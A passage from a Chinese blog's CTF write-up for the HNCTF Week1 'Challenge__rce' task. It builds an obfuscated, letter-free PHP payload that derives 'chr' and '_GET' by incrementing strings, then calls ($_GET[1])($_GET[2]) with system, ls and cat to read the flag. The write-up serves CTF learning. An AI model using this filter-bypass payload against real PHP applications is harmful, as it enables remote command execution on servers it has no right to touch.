<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">前自增加：</span><br><span class="line"></span><br><span class="line">$b = 1;</span><br><span class="line">$a = ++$b;       //此语句等同于： $b=$b+1; $a=$b；</span><br><span class="line">echo &#x27;$a=&#x27;.$a;</span><br><span class="line">echo &#x27;&lt;br&gt;&#x27;;</span><br><span class="line">echo &#x27;$b=&#x27;.$b;</span><br><span class="line">解释：前递增++$b,把$b的值增加了1后再返回给$b和$a</span><br><span class="line">结果：</span><br><span class="line">$a=2</span><br><span class="line">$b=2</span><br><span class="line"> </span><br><span class="line">后自增加：</span><br><span class="line">$b = 1;</span><br><span class="line">$a = $b++;      // 此语句等同于： $a=$b; $b=$b+1；</span><br><span class="line">echo &#x27;$a=&#x27;.$a;</span><br><span class="line">echo &#x27;&lt;br&gt;&#x27;;</span><br><span class="line">echo &#x27;$b=&#x27;.$b;</span><br><span class="line">结果：</span><br><span class="line">$a=1</span><br><span class="line">$b=2</span><br></pre></td></tr></table></figure>

<p>第一次写的payload为</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>.=[];<span class="comment">//$_为Array</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>[<span class="number">1</span>];<span class="comment">//$__为r</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="number">3</span>];<span class="comment">//$_为a</span></span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_0</span>=<span class="variable">$_</span>++;<span class="comment">//$_0为c，$_为d</span></span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//$_为g</span></span><br><span class="line"><span class="variable">$_1</span>=++<span class="variable">$_</span>;<span class="comment">//$_、$_1为h</span></span><br><span class="line"><span class="variable">$_3</span>=<span class="variable">$_0</span>.<span class="variable">$_1</span>.<span class="variable">$__</span>[<span class="number">1</span>];<span class="comment">//$_3为chr</span></span><br><span class="line"><span class="variable">$_4</span>=_.<span class="variable">$_3</span>(<span class="number">71</span>).<span class="variable">$_3</span>(<span class="number">69</span>).<span class="variable">$_3</span>(<span class="number">84</span>);<span class="comment">//利用php的chr函数得到_GET字符</span></span><br><span class="line">(<span class="variable">$$_4</span>[<span class="number">1</span>])(<span class="variable">$$_4</span>[<span class="number">2</span>]);<span class="comment">//拼接得到($_GET[1])($_GET[2])</span></span><br></pre></td></tr></table></figure>

<p>但是URL编码后提交，会显示too long!</p>
<p>那么还需要简化下payload。</p>
<p>观察下，发现可以利用把</p>
<p><code>$_1=++$_;//$_、$_1为h $_3=$_0.$_1.$__[1];//$_3为chr</code></p>
<p>合并起来，并且开始的    <code>$__=$_[1];//$__为r</code>   可以删除，然后与上面的合并。</p>
<p>总的来说就是利用<strong>后自增加</strong> 然后将$_变为h时，然后直接拼接成chr字符。</p>
<p>合并后代码，</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$__</span>.=[];<span class="comment">//$__不用定义为$，最后为$__为Array，</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$__</span>[<span class="number">3</span>];<span class="comment">//$_为a</span></span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_0</span>=<span class="variable">$_</span>++;<span class="comment">//$_开始为c，然后先赋值给$_0，然后再自增为d</span></span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_</span>++;</span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//这时的$_为g</span></span><br><span class="line"><span class="variable">$_0</span>.=++<span class="variable">$_</span>.<span class="variable">$__</span>[<span class="number">1</span>];<span class="comment">//$_开始为g，然后自增为h，$__[]为开始的Array，没有变,那么$__[1]为r。$_0为c，拼接后$_0为chr</span></span><br><span class="line"><span class="variable">$_4</span>=_.<span class="variable">$_0</span>(<span class="number">71</span>).<span class="variable">$_0</span>(<span class="number">69</span>).<span class="variable">$_0</span>(<span class="number">84</span>);<span class="comment">//$_4为_GET</span></span><br><span class="line">(<span class="variable">$$_4</span>[<span class="number">1</span>])(<span class="variable">$$_4</span>[<span class="number">2</span>]);<span class="comment">//($_GET[1])($_GET[2])</span></span><br></pre></td></tr></table></figure>

<p>用GET提交?hint&#x3D;1&amp;1&#x3D;system&amp;2&#x3D;ls，payload通过POST然后经URL编码，提交发现ls命令执行成功</p>
<p><img src="/2022/10/16/NSSCTF-HNCTF-Week1-Challenge-rce/5.png"></p>
<p>接下来依次执行ls &#x2F;</p>
<p><img src="/2022/10/16/NSSCTF-HNCTF-Week1-Challenge-rce/6.png"></p>
<p>最后直接cat &#x2F;ffflllaaaggg，找到flag</p>
<p><img src="/2022/10/16/NSSCTF-HNCTF-Week1-Challenge-rce/7.png"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/10/16/NSSCTF-HNCTF-Week1-Challenge-rce/" data-id="cl9hxo4hj000x20v4acu660ff" data-title="NSSCTF-HNCTF-[Week1]Challenge__rce" class="article-share-link">分享</a>
      
      
      
    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">下一页 &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">分类</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTFHUB-web-writeup/">CTFHUB_web_writeup</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-web-writeup/">CTF_web_writeup</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-writeup/">CTF_writeup</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%85%B6%E4%BB%96/">其他</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%95%B0%E5%AD%97%E5%8F%96%E8%AF%81/">数字取证</a></li></ul>
    </div>
  </div>


  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">归档</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/06/">六月 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">五月 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">四月 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">三月 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/11/">十一月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/10/">十月 2022</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">最新文章</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2023/06/27/FOFA%E8%AF%AD%E6%B3%95%E5%A4%A7%E5%85%A8/">FOFA语法大全</a>
          </li>
        
          <li>
            <a href="/2023/05/28/GFW%E5%92%8CDNS%E6%B1%A1%E6%9F%93/">GFW和DNS污染</a>
          </li>
        
          <li>
            <a href="/2023/05/15/LiteCTF2023-writeup/">LiteCTF2023_writeup</a>
          </li>
        
          <li>
            <a href="/2023/04/28/%E9%95%BF%E5%AE%89%E6%9D%AF%EF%BC%81%E5%AE%9D%E5%A1%94%E5%8F%96%E8%AF%81writeup/">长安杯！宝塔取证writeup</a>
          </li>
        
          <li>
            <a href="/2023/04/18/Github%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7/">Github搜索技巧</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2023 Jokak Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.4.1.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>